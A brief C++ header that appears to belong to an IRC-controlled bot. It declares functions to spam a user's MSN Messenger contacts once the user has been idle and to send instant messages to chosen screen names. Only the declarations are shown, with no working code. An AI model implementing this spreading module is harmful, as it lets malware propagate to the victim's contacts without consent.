#pragma once

#include <windows.h>
#include <atlbase.h>
#include <comutil.h>
#include <richedit.h>
#include <vector>
#include <string>
#include "msgrua.h"
#include "msgruaid.h"
#include "thread.h"
#include "irc.h"
#include "idletrack.h"
#include "debug.h"

namespace MSM
{
	VOID SpamContacts(PCHAR Message, DWORD MinIdleTime);
	VOID SendIM(PCHAR ScreenName, LPCTSTR Message, BOOL Close);
}